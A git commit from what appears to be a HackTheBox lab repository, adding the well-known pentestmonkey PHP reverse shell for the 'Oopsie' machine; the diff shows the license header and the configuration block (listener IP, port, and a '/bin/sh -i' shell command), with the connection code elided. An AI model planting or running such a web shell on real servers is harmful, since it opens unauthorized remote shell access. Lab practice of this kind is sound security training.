75660f9545db7e2fa03337c7b92cd951a3a7090f
vansteki <vansteki.tw@gmail.com>
2022-03-12 16:40:22 +0800

    feat: add php reverse shell

---
+++ HTB/start-point/tier2/Oopsie/php-reverse-shell.php
@@ -0,0 +1,21 @@
+ <?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+// https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php
+<SNIP>
+  set_time_limit (0);
+  $VERSION = "1.0";
+  $ip = '127.0.0.1';  // CHANGE THIS WITH YOUR IP
+  $port = 1234;       // CHANGE THIS WITH YOUR LISTENING PORT
+  $chunk_size = 1400;
+  $write_a = null;
+  $error_a = null;
+  $shell = 'uname -a; w; id; /bin/sh -i';
+  $daemon = 0;
+  $debug = 0;
+<SNIP> ?>
